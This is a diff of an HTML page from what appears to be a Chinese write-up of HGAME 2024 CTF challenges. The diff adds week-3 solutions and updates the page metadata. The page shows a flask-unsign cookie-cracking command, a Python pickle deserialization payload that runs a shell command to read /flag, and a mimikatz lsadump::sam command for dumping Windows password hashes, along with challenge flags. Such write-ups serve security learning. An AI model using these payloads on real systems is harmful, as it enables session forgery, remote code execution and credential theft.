@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/wdklsd.jpg">
 <meta property="article:published_time" content="2024-02-16T08:59:59.000Z">
-<meta property="article:modified_time" content="2024-02-17T03:16:02.156Z">
+<meta property="article:modified_time" content="2024-02-23T09:14:07.083Z">
 <meta property="article:author" content="J_0k3r">
 <meta property="article:tag" content="比赛Write Up">
 <meta name="twitter:card" content="summary_large_image">
@@ -269,7 +269,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          15k 字
+          16k 字
         
       </span>
     
@@ -280,7 +280,7 @@
         
         
         
-          128 分钟
+          137 分钟
         
       </span>
     
@@ -378,6 +378,10 @@
 <p><code>flask-unsign --unsign --cookie &#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc40VA.I1YZ3EhqqmkBJpga_wgyLGYS7UI&#39; --no-literal-eval --wordlist 1.txt</code><br><img src="/mdimg/hgame2024/1708088303765-e90ba744-eea1-4a03-972f-d0a99db4d8ae.png" srcset="/img/loading.gif" lazyload><br><code>235654</code><br>或者手打<br><img src="/mdimg/hgame2024/1708013439710-efc80eb1-21e2-4740-a440-f671496951b9.png" srcset="/img/loading.gif" lazyload><br>然后用伪造的session<br><img src="/mdimg/hgame2024/1708013603038-c3d0da69-3f88-4da4-b46a-4ba6310284fe.png" srcset="/img/loading.gif" lazyload><br>然后报错构造反序列化，要在linux跑</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>		<span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read())&quot;</span>,))<br>a=A()<br>test=pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(test))<br><span class="hljs-comment">#b&#x27;gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ3RhYyAvZmxhZycpLnJlYWQoKSmUhZRSlC4=&#x27;</span><br><br></code></pre></td></tr></table></figure>
 <p><img src="/mdimg/hgame2024/1708013297126-cc77305d-a4ba-4e68-9eff-30cf7d2b4b94.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="与ai聊天"><a href="#与ai聊天" class="headerlink" title="与ai聊天"></a>与ai聊天</h3><p><img src="/mdimg/hgame2024/1707925876069-d45cde6e-4e8f-4c5d-a6d5-18579da5e96f.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h3><p>手搓，注意63前面的那一个payload就行<br><code>[https://ctf.mzy0.com/CyberChef3/#recipe=From_Decimal%EF%BC%8810%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89(&#39;Space&#39;,false)Reverse(&#39;Character&#39;)&amp;input=MTI1IDEwMiA1MCAxMDIgOTcgNTYgNTAgNTcgNTMgOTkgNTYgNTEgMTAwIDQ1IDU0IDk5IDk3IDk4IDQ1IDU2IDU3IDEwMSA1MiA0NSA1MyA1MCA1NSA0OSA0NSA1NSAxMDEgMTAyIDk3IDk4IDk3IDk4IDk5IDEyMyAxMDMgOTcgMTA4IDEwMiA0NCA](https://ctf.mzy0.com/CyberChef3/#recipe=From_Decimal%EF%BC%8810%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89(&#39;Space&#39;,false)Reverse(&#39;Character&#39;)&amp;input=MTI1IDEwMiA1MCAxMDIgOTcgNTYgNTAgNTcgNTMgOTkgNTYgNTEgMTAwIDQ1IDU0IDk5IDk3IDk4IDQ1IDU2IDU3IDEwMSA1MiA0NSA1MyA1MCA1NSA0OSA0NSA1NSAxMDEgMTAyIDk3IDk4IDk3IDk4IDk5IDEyMyAxMDMgOTcgMTA4IDEwMiA0NCA)</code><br><code>flag&#123;cbabafe7-1725-4e98-bac6-d38c5928af2f&#125;</code></p>
+<h3 id="简单的取证-不过前十个有红包"><a href="#简单的取证-不过前十个有红包" class="headerlink" title="简单的取证,不过前十个有红包"></a>简单的取证,不过前十个有红包</h3><p>在另一个题的vmdk文件<br>7z解压<br>在<code>Documents and Settings\Administrator\桌面</code>找到密钥图片<br><code>968fJD17UBzZG6e3yjF6</code><br>挂载vc得到<code>hgame&#123;happy_new_year_her3_1s_a_redbag_key_41342177&#125;</code></p>
+<h3 id="简单的vmdk取证"><a href="#简单的vmdk取证" class="headerlink" title="简单的vmdk取证"></a>简单的vmdk取证</h3><p>找到sam和system文件<br>保存为<code>sam.hiv</code>和<code>system.hiv</code><br><code>lsadump::sam /sam:sam /system:system</code><br><img src="/mdimg/hgame2024/1707969470009-63c440ad-6afc-496b-8813-6e621c5baa4b.png" srcset="/img/loading.gif" lazyload><br>解md5为<code>Admin1234</code><br><code>hgame&#123;DAC3A2930FC196001F3AEAB959748448_Admin1234&#125;</code></p>
 
                 
               </div>
